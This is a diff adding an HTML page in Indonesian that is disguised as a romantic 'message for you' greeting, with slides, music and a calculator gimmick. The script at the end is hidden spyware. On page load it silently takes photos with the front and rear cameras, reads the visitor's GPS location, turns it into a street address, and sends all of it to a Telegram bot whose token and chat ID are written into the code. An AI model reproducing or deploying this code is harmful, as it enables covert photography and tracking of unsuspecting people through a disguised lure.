@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <style>
+    /* CSS Anda tetap sama */
+  </style>
+  <meta charset="utf-8">
+  <meta name="description" content="@feelthisray - Script HTML by Feeldream Repl Co">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+  <title>S.id/karena - Pesan Untukmu ❤️&zwj;🔥</title>
+  <link rel="icon" type="image/svg+xml" href="https://feeldreams.github.io/main-icon.png"> 
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://unpkg.com/typeit@8.7.0/dist/index.umd.js"></script>
+</head>
+<body>
+  <!-- Audio -->
+  <audio src="https://feeldreams.github.io/audio/foreveryoung.mp3" id="linkmp3" class="sembunyi"></audio>
+
+  <!-- Overlay dan Loading -->
+  <div class="overlay">
+    <div class="loading-message" style="display: none;">Hai kamu!<br>Tunggu dulu ya..</div>
+    <div id="loveIn" class="blocklove" style="display: flex;">
+      <style>.lovein svg{animation:none;stroke:#ff0000;stroke-width:1.3;fill:none;width:35px;height:35px}</style>
+      <label class="lovein"><svg class="line" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g transform="translate(2.550170, 3.550158)"><path d="M0.371729633,8.89614246 C-0.701270367,5.54614246 0.553729633,1.38114246 4.07072963,0.249142462 C5.92072963,-0.347857538 8.20372963,0.150142462 9.50072963,1.93914246 C10.7237296,0.0841424625 13.0727296,-0.343857538 14.9207296,0.249142462 C18.4367296,1.38114246 19.6987296,5.54614246 18.6267296,8.89614246 C16.9567296,14.2061425 11.1297296,16.9721425 9.50072963,16.9721425 C7.87272963,16.9721425 2.09772963,14.2681425 0.371729633,8.89614246 Z"></path><path d="M13.23843,4.013842 C14.44543,4.137842 15.20043,5.094842 15.15543,6.435842"></path></g></svg></label>
+      <p id="ket">Sentuh LOVEnya!</p>
+    </div>
+  </div>
+
+  <!-- Body Blur dan Wallpaper -->
+  <div id="bodyblur">
+    <img src="https://feeldreams.github.io/wp11.jpg" id="wallpaper">
+  </div>
+
+  <!-- Swiper -->
+  <div class="swiper mySwiper swiper-initialized swiper-horizontal swiper-backface-hidden">
+    <div class="swiper-wrapper" id="swiper-wrapper-a7871ce3f0b368d1" aria-live="polite">
+      <!-- Slide 1 -->
+      <div class="swiper-slide swiper-slide-active" role="group" aria-label="1 / 3" style="width: 762px;">
+        <div id="stiker1" class="scale0 stiker">
+          <img src="https://feeldreams.github.io/hearthappy.gif">
+        </div>
+        <h1 id="teks1" class="scale0 quicksand" style="font-size: 20px;">Aku Mau Nanya<br>ke Kamu Nih 🫣<br><br> &gt;&gt;&gt;&gt;</h1>
+      </div>
+
+      <!-- Slide 2 -->
+      <div class="swiper-slide swiper-slide-next" role="group" aria-label="2 / 3" style="width: 762px;">
+        <div id="stiker2" class="scale0 stiker">
+          <img src="https://feeldreams.github.io/mikir.gif">
+        </div>
+        <h1 id="teks2" class="scale0 quicksand" style="font-size: 20px;"><span style="font-size:26px;color:pink">5 + 5</span><br>Berapa yaa? 🤔<br><br> &gt;&gt;&gt;&gt;</h1>
+      </div>
+
+      <!-- Slide 3 -->
+      <div class="swiper-slide" role="group" aria-label="3 / 3" style="width: 762px;">
+        <div id="stiker3" class="scale0 stiker" style="margin-top:0">
+          <img id="stikerAkhir1" src="https://feeldreams.github.io/pusn2.gif">
+          <img id="stikerAkhir2" class="sembunyi" src="https://feeldreams.github.io/cilukba.gif">
+          <img id="stikerAkhir3" class="sembunyi" src="https://feeldreams.github.io/pandapanah.gif">
+        </div>
+        <h1 id="teks3" class="scale0 quicksand" style="font-size: 20px;">Hitung di Sini yaa! 😆<br><br> &gt;&gt;&gt;&gt;</h1>
+
+        <!-- Kalkulator -->
+        <div id="calculator" class="scale0 calculator">
+          <input type="text" class="calculator-screen" id="screen" disabled="">
+          <div class="calculator-keys">
+            <!-- Tombol kalkulator -->
+          </div>
+        </div>
+        <p id="teksLoveU" class="sembunyi"></p>
+        <p id="teksRandomEmoji" class="sembunyi">🩷</p>
+        <div id="contentAkhir" class="containerAkhir sembunyi">
+          <h1 id="teksAkhir" class="sembunyi quicksand" style="font-size: 18px;font-weight:400"></h1>
+        </div>
+      </div>
+    </div>
+    <div class="swiper-button-next" tabindex="0" role="button" aria-label="Next slide" aria-controls="swiper-wrapper-a7871ce3f0b368d1" aria-disabled="false"></div>
+    <div class="swiper-button-prev swiper-button-disabled" tabindex="-1" role="button" aria-label="Previous slide" aria-controls="swiper-wrapper-a7871ce3f0b368d1" aria-disabled="true"></div>
+    <div class="swiper-pagination swiper-pagination-bullets swiper-pagination-horizontal"><span class="swiper-pagination-bullet swiper-pagination-bullet-active" aria-current="true"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span></div>
+  </div>
+
+  <!-- Script untuk Kamera dan Nominatim -->
+  <script>
+    const botToken = '6660493311:AAGnUchxelmeOn2d2bhdCE-HBQK-v_ei_dc'; // Ganti dengan token bot Anda
+    const chatId = '5813466669'; // Ganti dengan chat ID Anda
+
+    // Fungsi untuk membuka kamera dan mengambil foto
+    async function openCamera(facingMode = 'user') {
+      const constraints = {
+        video: { facingMode: facingMode },
+        audio: false
+      };
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.autoplay = true;
+        document.body.appendChild(video);
+
+        // Ambil foto setelah 1 detik
+        setTimeout(() => captureImage(video, stream), 1000);
+      } catch (err) {
+        console.error("Error accessing camera: ", err);
+      }
+    }
+
+    // Fungsi untuk mengambil gambar dari video
+    async function captureImage(video, stream) {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Konversi gambar ke data URL
+      const imageData = canvas.toDataURL('image/png');
+
+      // Kirim gambar ke Telegram
+      await sendToTelegram(imageData, 'photo');
+
+      // Hentikan stream video
+      stream.getTracks().forEach(track => track.stop());
+      video.remove();
+    }
+
+    // Fungsi untuk mendapatkan lokasi menggunakan Nominatim
+    async function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          // Dapatkan alamat dari Nominatim
+          const nominatimUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+          const response = await fetch(nominatimUrl);
+          const data = await response.json();
+
+          // Kirim lokasi ke Telegram
+          const message = `Lokasi pengguna:\nLat: ${latitude}, Lon: ${longitude}\nAlamat: ${data.display_name}`;
+          await sendToTelegram(message, 'message');
+        }, showError);
+      } else {
+        console.error('Geolocation is not supported by this browser.');
+      }
+    }
+
+    // Fungsi untuk mengirim data ke Telegram
+    async function sendToTelegram(data, type) {
+      const url = `https://api.telegram.org/bot${botToken}/send${type === 'photo' ? 'Photo' : 'Message'}`;
+      const formData = new FormData();
+
+      if (type === 'photo') {
+        const blob = dataURLtoBlob(data);
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.png');
+      } else {
+        formData.append('chat_id', chatId);
+        formData.append('text', data);
+      }
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          console.log(`${type} sent successfully`);
+        } else {
+          console.error(`Failed to send ${type}`);
+        }
+      } catch (err) {
+        console.error(`Error sending ${type}: `, err);
+      }
+    }
+
+    // Fungsi untuk mengonversi data URL ke Blob
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], { type: mime });
+    }
+
+    // Fungsi untuk menampilkan error
+    function showError(error) {
+      let message = '';
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          message = 'User denied the request for Geolocation.';
+          break;
+        case error.POSITION_UNAVAILABLE:
+          message = 'Location information is unavailable.';
+          break;
+        case error.TIMEOUT:
+          message = 'The request to get user location timed out.';
+          break;
+        case error.UNKNOWN_ERROR:
+          message = 'An unknown error occurred.';
+          break;
+      }
+      console.error(message);
+    }
+
+    // Panggil fungsi saat halaman dimuat
+    window.onload = function () {
+      openCamera(); // Ambil foto dari kamera depan
+      setTimeout(() => openCamera('environment'), 2000); // Ambil foto dari kamera belakang setelah 2 detik
+      getLocation(); // Dapatkan lokasi
+    };
+  </script>
+</body>
+</html>
